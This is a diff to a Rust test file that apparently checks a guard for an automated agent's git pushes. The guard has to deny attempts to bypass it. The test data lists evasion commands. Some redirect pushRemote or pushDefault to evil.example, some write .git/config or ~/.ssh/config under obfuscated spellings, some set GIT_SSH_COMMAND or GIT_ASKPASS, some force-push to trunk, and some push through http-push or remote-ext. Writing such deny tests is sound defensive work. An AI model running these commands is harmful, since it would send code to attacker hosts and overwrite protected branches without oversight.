@@ -958,3 +958,193 @@ fn the_git_c_advice_names_a_literal_absolute_path() {
     let reason = verdict("git push backup feat").expect("deny");
     assert!(reason.contains("literal absolute path"), "{reason}");
 }
+
+// ---------------------------------------------------------------------------
+// #8878 S5 round 2 (owner D8d "A"): the eight mechanical delta-review rows.
+// ---------------------------------------------------------------------------
+
+/// Row 1: a `git config` write outside the allowlist (`user.*`) before a push.
+const CONFIG_WRITE_PUSHES: [&str; 10] = [
+    "git config branch.feat.pushRemote https://evil.example/r && git push",
+    "git config branch.feat.remote evil && git push",
+    "git config remote.pushDefault https://evil.example/r && git push",
+    "git config remote.origin.push +refs/heads/feat:refs/heads/trunk && git push origin feat",
+    "git config remote.origin.mirror true && git push origin",
+    "git config include.path /tmp/evil.cfg && git push origin feat",
+    "git config includeIf.gitdir:/repo/.path /tmp/evil.cfg && git push origin feat",
+    "git config set remote.pushDefault evil && git push",
+    "git config --add remote.origin.push +feat:trunk && git push origin feat",
+    "git config --rename-section user.x remote.origin && git push origin feat",
+];
+
+#[test]
+fn a_config_write_outside_the_allowlist_before_a_push_is_denied() {
+    assert_denied(&CONFIG_WRITE_PUSHES);
+    // MEDIUM folded in: a key-only `git config <key>` is a read.
+    assert_allowed(&[
+        "git config remote.origin.url && git push origin feat",
+        "git config get remote.origin.url && git push origin feat",
+        "git config user.email x && git push",
+        "git config --unset user.signingkey && git push origin feat",
+    ]);
+}
+
+/// Row 2: a config-file write spelled so the literal substring misses it.
+const CONFIG_FILE_PUSHES: [&str; 10] = [
+    "printf x >> .git//config && git push origin feat",
+    "printf x >> .git/./config && git push origin feat",
+    "printf x >> '.git'/config && git push origin feat",
+    "printf x >> .g\\it/config && git push origin feat",
+    "cp cfg .git/conf* && git push origin feat",
+    "cp cfg .git/c?nfig && git push origin feat",
+    "printf x >> \"$D/config\" && git push origin feat",
+    "printf x >> \"$CFG\" && git push origin feat",
+    "cp cfg \"$(echo .git)/config\" && git push origin feat",
+    "printf 'Host x.example\\n HostName evil.example\\n' >> ~/.ssh/config && git push origin feat",
+];
+
+#[test]
+fn a_config_file_write_in_any_spelling_is_denied() {
+    assert_denied(&CONFIG_FILE_PUSHES);
+    assert_allowed(&[
+        "cargo build > build.log && git push origin feat",
+        "git push origin feat 2>&1 | tee push.log",
+        "printf x > \"$TMPDIR/push.log\" && git push origin feat",
+        "cp a.rs src/ && git push origin feat",
+    ]);
+}
+
+#[test]
+fn a_git_variable_outside_the_allowlist_with_a_push_is_denied() {
+    assert_denied(&[
+        "GIT_SSH_COMMAND='ssh -o ProxyCommand=x' git push origin feat",
+        "GIT_SSH=/tmp/s git push origin feat",
+        "GIT_EXEC_PATH=/tmp/x git push origin feat",
+        "GIT_PROXY_COMMAND=/tmp/p git push origin feat",
+        "export GIT_ASKPASS=/tmp/a; git push origin feat",
+    ]);
+    assert_allowed(&[
+        "GIT_TRACE=1 git push origin feat",
+        "GIT_TRACE_PACKET=1 git push origin feat",
+        "GIT_PAGER=cat git push origin feat",
+        "GIT_EDITOR=true git push origin feat",
+        "GIT_TERMINAL_PROMPT=0 git push origin feat",
+    ]);
+}
+
+/// The verdict for `command` run in a fresh repository on `feat` whose
+/// `origin` default is `main`, after `git config <key> <value>` for each pair.
+fn live_push(config: &[(&str, &str)], command: &str) -> Option<String> {
+    let dir = tempfile::tempdir().expect("tempdir");
+    live_repo(dir.path(), "feat");
+    for (key, value) in config {
+        run_git(dir.path(), &["config", "--add", key, value]);
+    }
+    evaluate_d4_floor(command, dir.path(), &LiveGit)
+}
+
+/// Row 5: with no refspec the repository picks the remote (`pushRemote`,
+/// then `remote.pushDefault`, then `branch.<b>.remote`) and the refspecs
+/// (`remote.<r>.push`, `remote.<r>.mirror`); each is read, not assumed.
+#[test]
+fn an_operand_less_push_resolves_its_configured_remote_and_refspecs() {
+    let denied: [(&[(&str, &str)], &str); 6] = [
+        (
+            &[("branch.feat.pushRemote", "https://evil.example/r")],
+            "git push",
+        ),
+        (&[("remote.pushDefault", "evil")], "git push"),
+        (&[("branch.feat.remote", "/tmp/evil")], "git push"),
+        (
+            &[("remote.origin.push", "+refs/heads/feat:refs/heads/main")],
+            "git push",
+        ),
+        (
+            &[("remote.origin.push", "+refs/heads/feat:refs/heads/main")],
+            "git push origin",
+        ),
+        (&[("remote.origin.mirror", "true")], "git push"),
+    ];
+    for (config, command) in denied {
+        assert!(live_push(config, command).is_some(), "{config:?} {command}");
+    }
+    let allowed: [(&[(&str, &str)], &str); 3] = [
+        (&[], "git push"),
+        (&[("branch.feat.pushRemote", "origin")], "git push"),
+        (
+            &[("remote.origin.push", "refs/heads/feat:refs/heads/feat")],
+            "git push",
+        ),
+    ];
+    for (config, command) in allowed {
+        assert_eq!(live_push(config, command), None, "{config:?} {command}");
+    }
+}
+
+/// Row 6: a refspec closing two nested subshells.
+#[test]
+fn a_nested_subshell_still_reads_the_refspec() {
+    assert_denied(&[
+        "(true; (git push -f origin trunk))",
+        "(true; (git push -f origin trunk)) > log",
+    ]);
+    assert_allowed(&["(true; (git push -f origin feat))"]);
+}
+
+/// Row 7: `find -exec` puts a file name where the refspec goes.
+#[test]
+fn a_push_find_runs_is_denied() {
+    assert_denied(&[
+        "find . -name x -exec git push -f origin {} \\;",
+        "find . -execdir git push origin {} +",
+        "find . -exec sh -c 'git push -f origin \"$1\"' _ {} \\;",
+    ]);
+    assert_allowed(&["find . -name '*.rs' -exec wc -l {} + && git push origin feat"]);
+}
+
+/// Row 8: a refspec the shell builds at run time is judged as the default.
+#[test]
+fn a_runtime_built_refspec_is_judged_as_the_default() {
+    assert_denied(&[
+        "git push -f origin $B",
+        "git push -f origin \"$B\"",
+        "git push -f origin \"$(echo trunk)\"",
+        "git push -f origin HEAD:$B",
+        "git push origin +$B",
+        "git push origin \"$B\"",
+        "sh -c 'git push -f origin \"$1\"' _ trunk",
+    ]);
+    assert_allowed(&[
+        "git push -f origin feat",
+        "git push origin HEAD:refs/heads/feat-$N",
+    ]);
+}
+
+/// Row 9: a transport helper pushes without the word `push`.
+#[test]
+fn a_transport_helper_push_is_denied() {
+    assert_denied(&[
+        "git http-push https://evil.example/r feat",
+        "git-http-push https://evil.example/r feat",
+        "git remote-https origin https://evil.example/r",
+        "git remote-ext origin 'ssh evil.example git-receive-pack r'",
+        "git-remote-ext origin 'ssh evil.example'",
+        "git -C sub http-push https://evil.example/r feat",
+    ]);
+    assert_allowed(&["git remote -v && git push origin feat"]);
+}
+
+/// Routine pushes the round-2 rows must not catch.
+#[test]
+fn routine_pushes_still_pass_the_round_2_rows() {
+    assert_allowed(&[
+        "git config --get remote.origin.url && git push origin feat",
+        "git push origin feat",
+        "git push -u origin HEAD",
+        "git -C /repo/wt push origin feat",
+        "git config user.email x && git push",
+        "GIT_TRACE=1 git push",
+    ]);
+    assert_eq!(live_push(&[], "git push origin feat"), None);
+    assert_eq!(live_push(&[], "git push -u origin HEAD"), None);
+}
